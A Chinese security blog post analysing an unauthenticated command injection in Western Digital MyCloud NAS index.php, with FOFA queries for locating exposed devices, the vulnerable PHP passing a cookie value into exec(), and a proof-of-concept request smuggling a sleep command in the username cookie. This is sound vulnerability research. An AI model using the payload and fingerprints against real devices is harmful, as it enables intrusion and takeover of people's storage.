---
title: "西部数码 NAS index.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-index-rce.html
asset_dir: assets/西部数码-nas-index.php-命令执行漏洞
---

# 西部数码 NAS index.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/7 12:05
- 783浏览
- [0评论](#comment)
- 13分钟阅读

深入探索

备份

滙豐卡$2000減$150 WD 3.5吋 4TB My Cloud Home 網絡儲存裝置 wdbvxc0040hwt 香港行貨

网页服务器

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS index.php中Cookie存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞预警服务

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

直接看 `index.php` 其业务实现逻辑如下

```
function do_login($username)
{
        $ret = 0; //no login;

        if ($username != "")
        {
                /* [+] Get Web Timeout setting */
                $res = array();
                exec("xmldbc -g /system_mgr/idle/time", $res);
                $web_timeout = $res[0]*60;
                /* [-] Get Web Timeout setting */

                exec("wto -n \"$username\" -g", $ret);
```

在看下`$username`来自那里

硬盘驱动器

```
if (isset($_SESSION['username']))
{
    $username = $_SESSION['username'];
}
else if (isset($_COOKIE['username']))
{
    $username = $_COOKIE['username'];
}
```

通过`session`或者`cookie`里的`username`获取，用户可控的部分为`cookie`,且不需要登录，前台权限即可。

深入探索

服务器安全服务

防火墙软件

物流软件安全

再看下那里调用了`do_login`方法

[![西部数码 NAS index.php 命令执行漏洞](images/img-001-c9809c351d70.webp)](https://image.mrxn.net/fbb3399b3ddc41558a90f88006b19827.webp)

自此，整个流程就通了，代码中通过`cookie`里的`username`直接获取用户输入参数，未经过任何过滤或转义便拼接至系统命令 `exec("wto -n \"$username\" -g", $ret);` 中，攻击者可通过构造恶意参数[注入任意系统命令](https://mrxn.net/tag/rce)。

深入探索

漏洞扫描服务

安全工具开发

编程语言教程

# 漏洞复现

```
GET /web/index.php HTTP/1.1
Host: west.nas.mrxn.net
Cookie: username=a" || sleep 3 || "
```

[![西部数码 NAS index.php 命令执行漏洞](images/img-002-0e72177b91cc.webp)](https://image.mrxn.net/555d5c70d32343d18b8fb5cdd70f3298.webp)

成功延时 3 秒

数据备份与恢复

- 标签：
- [#代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
